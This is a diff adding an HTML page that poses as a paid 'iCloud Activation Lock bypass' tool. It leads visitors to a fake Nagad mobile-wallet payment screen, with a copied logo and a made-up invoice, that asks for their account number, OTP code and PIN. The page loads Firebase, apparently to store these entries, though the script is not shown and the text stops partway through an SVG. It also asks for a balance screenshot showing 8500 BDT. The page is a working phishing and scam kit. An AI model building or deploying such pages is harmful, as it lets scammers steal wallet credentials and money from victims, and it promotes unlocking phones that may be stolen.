@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>iCloud Bypass · iPhone Unlock</title>
+  <!-- Font Awesome Icons & Google Font -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #0b0e14;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 16px;
+    }
+    .app-container {
+      max-width: 1280px;
+      width: 100%;
+      background: linear-gradient(145deg, #141a24, #0f131c);
+      border-radius: 48px;
+      padding: 24px 28px 32px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.03);
+      transition: all 0.2s;
+    }
+    /* login overlay */
+    .login-overlay {
+      background: rgba(11, 14, 20, 0.85);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      border-radius: 48px;
+      padding: 40px 28px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid rgba(255,255,255,0.04);
+    }
+    .login-box {
+      max-width: 440px;
+      width: 100%;
+      background: #1a212b;
+      padding: 36px 32px 40px;
+      border-radius: 40px;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,0.03), 0 12px 30px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    .login-box .icon-lock {
+      font-size: 38px;
+      color: #3b82f6;
+      background: #1e293b;
+      width: 72px;
+      height: 72px;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 18px;
+      box-shadow: 0 8px 12px rgba(0,0,0,0.4);
+    }
+    .login-box h2 {
+      color: #f0f4fe;
+      font-weight: 600;
+      font-size: 22px;
+      letter-spacing: -0.3px;
+      margin-bottom: 8px;
+    }
+    .login-box p {
+      color: #8b95a9;
+      font-size: 14px;
+      margin-bottom: 26px;
+    }
+    .login-box input {
+      width: 100%;
+      background: #0f141e;
+      border: 1px solid #2a3340;
+      padding: 16px 18px;
+      border-radius: 30px;
+      color: #f0f4fe;
+      font-size: 15px;
+      outline: none;
+      transition: 0.15s;
+      font-weight: 500;
+    }
+    .login-box input:focus {
+      border-color: #3b82f6;
+      background: #121a26;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+    }
+    .login-box input::placeholder {
+      color: #5b667b;
+      font-weight: 400;
+    }
+    .login-btn {
+      width: 100%;
+      margin-top: 22px;
+      background: #3b82f6;
+      border: none;
+      padding: 16px;
+      border-radius: 40px;
+      font-weight: 600;
+      font-size: 17px;
+      color: white;
+      cursor: pointer;
+      transition: 0.15s;
+      box-shadow: 0 8px 18px rgba(59, 130, 246, 0.25);
+      letter-spacing: 0.3px;
+    }
+    .login-btn:hover {
+      background: #2563eb;
+      transform: scale(0.98);
+      box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+    }
+    .login-skip {
+      margin-top: 18px;
+      color: #6b7a93;
+      background: transparent;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: underline dotted rgba(255,255,255,0.15);
+      transition: 0.1s;
+      padding: 8px 12px;
+      border-radius: 30px;
+    }
+    .login-skip:hover {
+      color: #a0b3d0;
+    }
+    .login-error {
+      background: #2c1a1a;
+      color: #f87171;
+      padding: 10px 12px;
+      border-radius: 40px;
+      font-size: 13px;
+      margin-top: 14px;
+      border: 1px solid #4b2a2a;
+      display: none;
+    }
+    /* main dashboard */
+    .main-dashboard {
+      display: none;
+      flex-direction: column;
+      gap: 22px;
+    }
+    /* top bar */
+    .top-bar {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px 16px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid rgba(255,255,255,0.03);
+    }
+    .top-bar .left-actions {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+    .top-bar .left-actions button {
+      background: #1e2733;
+      border: none;
+      color: #cbd5e1;
+      padding: 8px 18px;
+      border-radius: 40px;
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      cursor: default;
+      transition: 0.1s;
+      border: 1px solid #2a3340;
+      letter-spacing: 0.2px;
+    }
+    .top-bar .left-actions button i {
+      color: #5f7a9a;
+    }
+    .top-bar .brand {
+      color: #b9c7e0;
+      font-weight: 500;
+      font-size: 14px;
+      background: #1a222e;
+      padding: 6px 18px;
+      border-radius: 40px;
+      border: 1px solid #2a3340;
+      letter-spacing: 0.3px;
+    }
+    .top-bar .brand i {
+      color: #3b82f6;
+      margin-right: 6px;
+    }
+    /* main row */
+    .main-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 28px;
+      margin-top: 8px;
+    }
+    .left-image-section {
+      flex: 1.1;
+      min-width: 220px;
+      background: #131b26;
+      border-radius: 40px;
+      padding: 28px 16px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border: 1px solid #212b38;
+      box-shadow: inset 0 2px 0 rgba(255,255,255,0.02);
+    }
+    .iphone-shell {
+      font-size: 100px;
+      color: #3b82f6;
+      filter: drop-shadow(0 8px 20px rgba(59,130,246,0.2));
+      line-height: 1;
+      margin-bottom: 6px;
+      position: relative;
+      width: 120px;
+      height: 200px;
+      background: #0f1620;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 2px solid #2a3340;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.6), inset 0 0 0 1px rgba(255,255,255,0.05);
+    }
+    .iphone-shell i {
+      font-size: 70px;
+      color: #3b82f6;
+      opacity: 0.9;
+      text-shadow: 0 0 20px rgba(59,130,246,0.15);
+    }
+    .iphone-shell .notch {
+      position: absolute;
+      top: 12px;
+      width: 50px;
+      height: 18px;
+      background: #0b0e14;
+      border-radius: 20px;
+      border: 1px solid #1a222e;
+    }
+    .model-text {
+      color: #e8edf5;
+      font-weight: 600;
+      font-size: 18px;
+      background: #1f2939;
+      padding: 8px 24px;
+      border-radius: 40px;
+      letter-spacing: 0.5px;
+      border: 1px solid #2f3b4b;
+      margin-top: 12px;
+    }
+    .processor-text {
+      color: #7a8aa3;
+      font-size: 13px;
+      margin-top: 6px;
+      background: #18202b;
+      padding: 4px 16px;
+      border-radius: 30px;
+      border: 1px solid #26303e;
+    }
+    .right-panel {
+      flex: 2.2;
+      min-width: 300px;
+      display: flex;
+      flex-direction: column;
+      gap: 16px;
+    }
+    .combo-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+    .combo-row select {
+      flex: 1 1 160px;
+      background: #131b26;
+      border: 1px solid #293341;
+      padding: 14px 16px;
+      border-radius: 40px;
+      color: #f0f4fe;
+      font-weight: 500;
+      font-size: 14px;
+      outline: none;
+      cursor: pointer;
+      transition: 0.1s;
+      appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236b7a93' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 18px center;
+    }
+    .combo-row select:focus {
+      border-color: #3b82f6;
+      background-color: #101a28;
+    }
+    .combo-row select option {
+      background: #1a222e;
+      color: #f0f4fe;
+    }
+    .connected-status {
+      background: #0c1a1c;
+      color: #5ee0b0;
+      padding: 10px 18px;
+      border-radius: 40px;
+      font-size: 14px;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      border: 1px solid #1d3a3a;
+      width: fit-content;
+      letter-spacing: 0.3px;
+    }
+    .connected-status i {
+      font-size: 12px;
+      color: #34d399;
+    }
+    .info-fields {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 4px;
+    }
+    .info-fields input {
+      background: #0f1620;
+      border: 1px solid #26303e;
+      padding: 15px 18px;
+      border-radius: 40px;
+      color: #f0f4fe;
+      font-size: 14px;
+      outline: none;
+      transition: 0.1s;
+      width: 100%;
+    }
+    .info-fields input:focus {
+      border-color: #3b82f6;
+      background: #121b2a;
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.08);
+    }
+    .info-fields input::placeholder {
+      color: #4f5d74;
+      font-weight: 400;
+    }
+    .bypass-btn {
+      background: #3b82f6;
+      border: none;
+      padding: 16px 20px;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 17px;
+      color: white;
+      cursor: pointer;
+      transition: 0.15s;
+      box-shadow: 0 8px 18px rgba(59, 130, 246, 0.2);
+      margin-top: 8px;
+      letter-spacing: 0.3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .bypass-btn:hover {
+      background: #2563eb;
+      transform: scale(0.98);
+    }
+    .bypass-btn:disabled {
+      opacity: 0.5;
+      pointer-events: none;
+      filter: grayscale(0.5);
+    }
+    .view-only-mode button:not(.top-bar button), 
+    .view-only-mode .bypass-btn, 
+    .view-only-mode select,
+    .view-only-mode input {
+      opacity: 0.45;
+      pointer-events: none;
+      filter: grayscale(0.3);
+    }
+    .view-only-mode .connected-status {
+      opacity: 0.5;
+    }
+    .view-only-mode .bypass-btn {
+      opacity: 0.45;
+      pointer-events: none;
+      filter: grayscale(0.3);
+    }
+    .field-error {
+      border-color: #ef4444 !important;
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15) !important;
+    }
+    .error-message {
+      color: #f87171;
+      font-size: 12px;
+      margin-top: -6px;
+      display: none;
+      padding-left: 16px;
+    }
+    .footer-note {
+      margin-top: 10px;
+      color: #3d4b5e;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    /* Bypass Confirm UI */
+    .bypass-confirm-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+    .bypass-confirm-box {
+      background: #1a212b;
+      max-width: 520px;
+      width: 100%;
+      border-radius: 32px;
+      padding: 36px 32px 32px;
+      border: 1px solid #2f3b4b;
+      box-shadow: 0 40px 80px rgba(0,0,0,0.8);
+      max-height: 90vh;
+      overflow-y: auto;
+    }
+    .bypass-confirm-box .title {
+      color: #f0f4fe;
+      font-size: 22px;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 20px;
+      letter-spacing: 0.3px;
+    }
+    .bypass-confirm-box .title i {
+      color: #3b82f6;
+      margin-right: 10px;
+    }
+    .bypass-confirm-box .device-info {
+      background: #0f1620;
+      border-radius: 16px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      border: 1px solid #26303e;
+    }
+    .bypass-confirm-box .device-info .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      color: #cbd5e1;
+      font-size: 14px;
+    }
+    .bypass-confirm-box .device-info .info-row .label {
+      color: #8b95a9;
+    }
+    .bypass-confirm-box .device-info .info-row .value {
+      font-weight: 600;
+      color: #f0f4fe;
+    }
+    .bypass-confirm-box .rules-section {
+      background: #0f1620;
+      border-radius: 16px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      border: 1px solid #26303e;
+    }
+    .bypass-confirm-box .rules-section .rule-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      padding: 4px 0;
+      color: #cbd5e1;
+      font-size: 13px;
+      line-height: 1.5;
+    }
+    .bypass-confirm-box .rules-section .rule-item i {
+      color: #fbbf24;
+      margin-top: 2px;
+      font-size: 14px;
+    }
+    .bypass-confirm-box .price-display {
+      text-align: center;
+      background: #0f1620;
+      border-radius: 16px;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #26303e;
+    }
+    .bypass-confirm-box .price-display .price-label {
+      color: #8b95a9;
+      font-size: 13px;
+    }
+    .bypass-confirm-box .price-display .price-amount {
+      color: #3b82f6;
+      font-size: 28px;
+      font-weight: 700;
+      margin-top: 4px;
+    }
+    .bypass-confirm-box .price-display .price-amount span {
+      font-size: 16px;
+      font-weight: 400;
+      color: #8b95a9;
+    }
+    .bypass-confirm-box .screenshot-section {
+      background: #0f1620;
+      border-radius: 16px;
+      padding: 16px 20px;
+      margin-bottom: 20px;
+      border: 1px solid #26303e;
+      text-align: center;
+    }
+    .bypass-confirm-box .screenshot-section .upload-label {
+      display: block;
+      color: #8b95a9;
+      font-size: 13px;
+      margin-bottom: 12px;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box {
+      border: 2px dashed #2a3340;
+      border-radius: 12px;
+      padding: 20px;
+      cursor: pointer;
+      transition: 0.2s;
+      background: #0b0e14;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box:hover {
+      border-color: #3b82f6;
+      background: #101a28;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box i {
+      font-size: 32px;
+      color: #3b82f6;
+      display: block;
+      margin-bottom: 8px;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box .upload-text {
+      color: #8b95a9;
+      font-size: 13px;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box .file-name {
+      color: #34d399;
+      font-size: 13px;
+      font-weight: 500;
+      margin-top: 6px;
+      display: none;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box.has-file {
+      border-color: #34d399;
+      background: #0c1a1c;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box.has-file .file-name {
+      display: block;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box.has-file .upload-text {
+      display: none;
+    }
+    .bypass-confirm-box .screenshot-section .upload-box.has-file i {
+      color: #34d399;
+    }
+    .bypass-confirm-box .proceed-pay-btn {
+      width: 100%;
+      background: #3b82f6;
+      border: none;
+      padding: 16px;
+      border-radius: 60px;
+      font-weight: 700;
+      font-size: 17px;
+      color: white;
+      cursor: pointer;
+      transition: 0.15s;
+      box-shadow: 0 8px 18px rgba(59, 130, 246, 0.2);
+      letter-spacing: 0.3px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .bypass-confirm-box .proceed-pay-btn:hover {
+      background: #2563eb;
+      transform: scale(0.98);
+    }
+    .bypass-confirm-box .proceed-pay-btn:disabled {
+      opacity: 0.5;
+      pointer-events: none;
+      filter: grayscale(0.5);
+    }
+    .bypass-confirm-box .close-confirm-btn {
+      width: 100%;
+      background: transparent;
+      border: 1px solid #2a3340;
+      padding: 14px;
+      border-radius: 60px;
+      font-weight: 500;
+      font-size: 15px;
+      color: #8b95a9;
+      cursor: pointer;
+      transition: 0.15s;
+      margin-top: 10px;
+    }
+    .bypass-confirm-box .close-confirm-btn:hover {
+      background: #1e2733;
+    }
+
+    /* Payment */
+    .payment-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1001;
+      padding: 20px;
+    }
+    .payment-container {
+      width: 100%;
+      max-width: 380px;
+      height: 680px;
+      background: radial-gradient(circle at 50% 45%, #cf1b1d 0%, #a10d10 50%, #680507 85%, #460002 100%);
+      border: 1px solid #730000;
+      padding: 15px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      position: relative;
+      color: #ffffff;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      border-radius: 24px;
+    }
+    .payment-container .top-bar {
+      width: 100%;
+      display: flex;
+      justify-content: flex-end;
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+    .payment-container .lang-toggle {
+      display: inline-flex;
+      border: 1px solid #ffffff;
+      border-radius: 6px;
+      overflow: hidden;
+      font-size: 11px;
+      font-weight: bold;
+    }
+    .payment-container .lang-toggle span {
+      padding: 3px 6px;
+      cursor: pointer;
+    }
+    .payment-container .lang-toggle .bn {
+      background-color: #ffffff;
+      color: #b70000;
+    }
+    .payment-container .lang-toggle .en {
+      background-color: transparent;
+      color: #ffffff;
+    }
+    .payment-container .content {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-top: -10px;
+    }
+    .payment-container .cart-icon {
+      width: 80px;
+      height: 60px;
+      margin-bottom: 10px;
+    }
+    .payment-container .merchant-name {
+      font-size: 16px;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      text-align: center;
+      margin-bottom: 25px;
+      text-transform: uppercase;
+      color: #ffffff;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+    }
+    .payment-container .info-section {
+      width: 100%;
+      padding-left: 5px;
+      margin-bottom: 30px;
+      font-size: 15px;
+      line-height: 1.8;
+    }
+    .payment-container .info-row {
+      display: flex;
+      margin-bottom: 4px;
+    }
+    .payment-container .info-label {
+      font-weight: bold;
+      margin-right: 8px;
+    }
+    .payment-container .info-value {
+      font-weight: normal;
+      opacity: 0.95;
+    }
+    .payment-container .step-view {
+      display: none;
+      width: 100%;
+      flex-direction: column;
+      align-items: center;
+    }
+    .payment-container .step-view.active {
+      display: flex;
+    }
+    .payment-container .input-label {
+      font-size: 15px;
+      margin-bottom: 12px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    .payment-container .digits-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
+      margin-bottom: 20px;
+      width: 100%;
+    }
+    .payment-container .digit-box {
+      width: 22px;
+      height: 26px;
+      background-color: #ffffff;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+      outline: none;
+    }
+    .payment-container .digit-box:focus {
+      border-color: #a10d10;
+      box-shadow: 0 0 4px rgba(255, 255, 255, 0.9);
+    }
+    .payment-container .dash {
+      font-weight: bold;
+      font-size: 16px;
+      color: #ffffff;
+      margin: 0 1px;
+    }
+    .payment-container .terms-text {
+      font-size: 12px;
+      text-align: center;
+      line-height: 1.4;
+      opacity: 0.95;
+      margin-bottom: 22px;
+      width: 85%;
+    }
+    .payment-container .terms-text strong {
+      font-weight: bold;
+    }
+    .payment-container .button-group {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      width: 100%;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+    }
+    .payment-container .btn {
+      background-color: #ffffff;
+      color: #8b0000;
+      font-weight: bold;
+      font-size: 13px;
+      padding: 7px 16px;
+      border-radius: 6px;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+      transition: background 0.2s;
+      white-space: nowrap;
+    }
+    .payment-container .btn:hover {
+      background-color: #f0f0f0;
+    }
+    .payment-container .footer-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .payment-container .footer-logo svg {
+      width: 110px;
+      height: auto;
+    }
+    .payment-container .toast-msg {
+      background: rgba(180,0,0,0.8);
+      color: #fff;
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 12px;
+      margin-top: 5px;
+      transition: 0.2s;
+      display: none;
+    }
+    .payment-close-btn {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+      background: rgba(255,255,255,0.15);
+      border: none;
+      color: #fff;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      font-size: 16px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: 0.2s;
+      backdrop-filter: blur(4px);
+    }
+    .payment-close-btn:hover {
+      background: rgba(255,255,255,0.25);
+    }
+    .bypass-confirm-box::-webkit-scrollbar {
+      width: 4px;
+    }
+    .bypass-confirm-box::-webkit-scrollbar-track {
+      background: #0f1620;
+      border-radius: 10px;
+    }
+    .bypass-confirm-box::-webkit-scrollbar-thumb {
+      background: #2a3340;
+      border-radius: 10px;
+    }
+  </style>
+</head>
+<body>
+<div class="app-container" id="appContainer">
+
+  <!-- LOGIN OVERLAY -->
+  <div id="loginOverlay" class="login-overlay">
+    <div class="login-box">
+      <div class="icon-lock"><i class="fas fa-key"></i></div>
+      <h2>License authentication</h2>
+      <p>Enter your activation key to continue</p>
+      <input type="text" id="licenseInput" placeholder="e.g. X7F9-2K4M-8R3T" autocomplete="off">
+      <button class="login-btn" id="loginBtn"><i class="fas fa-unlock-alt" style="margin-right: 10px;"></i> Unlock</button>
+      <button class="login-skip" id="skipBtn"><i class="fas fa-eye" style="margin-right: 6px;"></i> Skip (view only)</button>
+      <div id="loginError" class="login-error"><i class="fas fa-exclamation-circle" style="margin-right: 8px;"></i> Invalid license key</div>
+    </div>
+  </div>
+
+  <!-- MAIN DASHBOARD -->
+  <div id="mainDashboard" class="main-dashboard">
+
+    <!-- top bar -->
+    <div class="top-bar">
+      <div class="left-actions">
+        <button><i class="fas fa-star"></i> View Reviews</button>
+        <button><i class="fas fa-headset"></i> Ask for support</button>
+        <button><i class="fas fa-code"></i> Dev by Rakib Hossain</button>
+      </div>
+      <div class="brand"><i class="fas fa-cloud-upload-alt"></i> iCloud Bypass</div>
+    </div>
+
+    <!-- main row -->
+    <div class="main-row" id="mainWorkArea">
+      <!-- left iphone image -->
+      <div class="left-image-section">
+        <div class="iphone-shell">
+          <div class="notch"></div>
+          <i class="fas fa-mobile-alt"></i>
+        </div>
+        <div class="model-text" id="phoneModelDisplay">iPhone 17 Pro Max</div>
+        <div class="processor-text" id="processorDisplay"><i class="fas fa-microchip"></i> A19 Pro</div>
+      </div>
+
+      <!-- right panel -->
+      <div class="right-panel">
+        <div class="combo-row">
+          <select id="modelSelect"></select>
+          <select id="versionSelect"></select>
+        </div>
+        <div class="connected-status"><i class="fas fa-circle" style="color: #34d399;"></i> Connected.....</div>
+
+        <div class="info-fields">
+          <input type="text" placeholder="Enter Your Serial Number" id="serialInput">
+          <div class="error-message" id="serialError">Please enter serial number</div>
+          <input type="text" placeholder="Enter Your Model Number" id="modelNumberInput">
+          <div class="error-message" id="modelNumberError">Please enter model number</div>
+          <input type="text" placeholder="Type Your Phone Variant" id="variantInput">
+          <div class="error-message" id="variantError">Please enter phone variant</div>
+        </div>
+
+        <button class="bypass-btn" id="bypassBtn"><i class="fas fa-unlock"></i> Bypass Activation Lock</button>
+        <div style="font-size:12px; color:#3f4d62; margin-top: 6px; text-align: center;"><i class="fas fa-shield-alt"></i> secure · 256-bit</div>
+      </div>
+    </div>
+    <div class="footer-note">© 2026 · iCloud bypass tool · demo only</div>
+  </div>
+</div>
+
+<!-- BYPASS CONFIRMATION UI -->
+<div id="bypassConfirmOverlay" class="bypass-confirm-overlay">
+  <div class="bypass-confirm-box">
+    <div class="title"><i class="fas fa-unlock-alt"></i> Apple iCloud Activation Lock Bypass Tool</div>
+    <div class="device-info">
+      <div class="info-row"><span class="label">Model</span><span class="value" id="confirmModel">iPhone 17 Pro Max</span></div>
+      <div class="info-row"><span class="label">iOS Version</span><span class="value" id="confirmVersion">iOS 17 All Version</span></div>
+    </div>
+    <div class="rules-section">
+      <div class="rule-item"><i class="fas fa-check-circle"></i><span>Bypass First, Then Payment</span></div>
+      <div class="rule-item"><i class="fas fa-shield-alt"></i><span>Full Secured, No Risk</span></div>
+    </div>
+    <div class="price-display">
+      <div class="price-label">Bypass Price</div>
+      <div class="price-amount">8500 <span>BDT</span></div>
+    </div>
+    <div class="screenshot-section">
+      <div class="upload-label">Payment Via Nagad Only, To process it, You have to pay 55 BDT as confirmation, And your nagad balance should be 8500 or more than 8500 for risk issues.</div>
+      <div class="upload-label" style="margin-top: 8px; font-weight: 500; color: #f0f4fe;">As a balance confirmation, You have to Attach a screenshot of your balance</div>
+      <div class="upload-box" id="uploadBox" onclick="document.getElementById('screenshotInput').click()">
+        <i class="fas fa-image"></i>
+        <div class="upload-text">Select Your Screenshot of Nagad Balance</div>
+        <div class="file-name" id="fileNameDisplay">📎 <span id="fileNameText"></span></div>
+      </div>
+      <input type="file" id="screenshotInput" accept="image/*" style="display: none;">
+    </div>
+    <button class="proceed-pay-btn" id="proceedToPayBtn" disabled><i class="fas fa-arrow-right"></i> Proceed To Pay 55BDT</button>
+    <button class="close-confirm-btn" id="closeConfirmBtn"><i class="fas fa-times"></i> Close</button>
+  </div>
+</div>
+
+<!-- NAGAD PAYMENT OVERLAY -->
+<div id="paymentOverlay" class="payment-overlay">
+  <div class="payment-container">
+    <button class="payment-close-btn" id="paymentCloseBtn"><i class="fas fa-times"></i></button>
+    <div class="top-bar">
+      <div class="lang-toggle"><span class="bn">বাং</span><span class="en">Eng</span></div>
+    </div>
+    <div class="content">
+      <svg class="cart-icon" viewBox="0 0 100 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect x="42" y="12" width="22" height="18" fill="#ffffff" rx="1"/>
+        <path d="M42 18 H64 M53 12 V30" stroke="#a10d10" stroke-width="1.5"/>
+        <rect x="52" y="8" width="18" height="15" fill="#ffffff" rx="1"/>
+        <path d="M52 14 H70 M61 8 V23" stroke="#a10d10" stroke-width="1.5"/>
+        <path d="M25 25 L32 50 H65 L75 25 Z" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linejoin="round"/>
+        <path d="M30 32 H72 M31 40 H68" stroke="#ffffff" stroke-width="1.5"/>
+        <path d="M18 20 H25 L32 50" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        <circle cx="38" cy="58" r="3.5" stroke="#ffffff" stroke-width="2" fill="none"/>
+        <circle cx="59" cy="58" r="3.5" stroke="#ffffff" stroke-width="2" fill="none"/>
+        <circle cx="15" cy="30" r="1" fill="#ffffff"/>
+        <circle cx="12" cy="38" r="1.5" fill="#ffffff"/>
+        <circle cx="78" cy="22" r="1" fill="#ffffff"/>
+        <circle cx="82" cy="28" r="1.5" fill="#ffffff"/>
+      </svg>
+      <div class="merchant-name">MS EKTI ELECTRICK HARD</div>
+      <div class="info-section">
+        <div class="info-row"><span class="info-label">Invoice No:</span><span class="info-value">CC47171253</span></div>
+        <div class="info-row"><span class="info-label">Total Amount:</span><span class="info-value">BDT 55.00</span></div>
+        <div class="info-row"><span class="info-label">Charge:</span><span class="info-value">BDT 0</span></div>
+      </div>
+      <div class="step-view active" id="step-account">
+        <div class="input-label">Your Nagad Account Number</div>
+        <div class="digits-container">
+          <input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" />
+          <span class="dash">-</span>
+          <input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" />
+          <span class="dash">-</span>
+          <input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" />
+        </div>
+        <div class="terms-text">By clicking/tapping "Proceed" you are agreeing to our <strong>Terms and Conditions</strong></div>
+        <div class="button-group">
+          <button class="btn" id="btnAccountProceed">Proceed</button>
+          <button class="btn" onclick="resetPaymentForm()">Close</button>
+        </div>
+      </div>
+      <div class="step-view" id="step-otp">
+        <div class="input-label">Enter Verification Code [OTP]</div>
+        <div class="digits-container">
+          <input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" />
+          <input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" /><input type="text" class="digit-box" maxlength="1" />
+        </div>
+        <div class="terms-text">By clicking/tapping "Proceed" you are agreeing to our <strong>Terms and Conditions</strong></div>
+        <div class="button-group">
+          <button class="btn" id="btnOtpProceed">Proceed</button>
+          <button class="btn" onclick="resendOtp()">Resend code</button>
+          <button class="btn" onclick="goToStep('step-account')">Close</button>
+        </div>
+      </div>
+      <div class="step-view" id="step-pin">
+        <div class="input-label">Enter Your Pin</div>
+        <div class="digits-container">
+          <input type="password" class="digit-box" maxlength="1" /><input type="password" class="digit-box" maxlength="1" />
+          <input type="password" class="digit-box" maxlength="1" /><input type="password" class="digit-box" maxlength="1" />
+        </div>
+        <div class="terms-text">By clicking/tapping "Proceed" you are agreeing to our <strong>Terms and Conditions</strong></div>
+        <div class="button-group">
+          <button class="btn" id="btnPinProceed">Proceed</button>
+          <button class="btn" onclick="goToStep('step-otp')">Close</button>
+        </div>
+      </div>
+      <div id="firebaseStatus" class="toast-msg"></div>
+    </div>
+    <div class="footer-logo">
+      <svg viewBox="0 0 200 70" xmlns="http://www.w3.org/2000/svg">
+        <g fill="#ffffff">
+          <path d="M 42 12 C 30 18 22 30 25 44 C 27 52 34 58 43 59 C 32 55 28 44 33 34 C 36 28 42 22 49 19 C 45 23 44 28 47 32 C 51 36 57 37 60 43 C 63 49 59 57 52 60 C 65 58 72 45 68 33 C 65 24 55 17 42 12 Z"/>
+          <path d="M 40 38 C 38 35 41 31 45 32 C 48 33 49 37 47 40 C 44 43 39 42 40 38 Z"/>
+        </g>
+        <text x="80" y="48" fill="#ffffff" font-family="'SolaimanLipi', 'Siyam Rupali', Arial, sans-serif" font-size="34" font-weight="bold">নগদ</text>
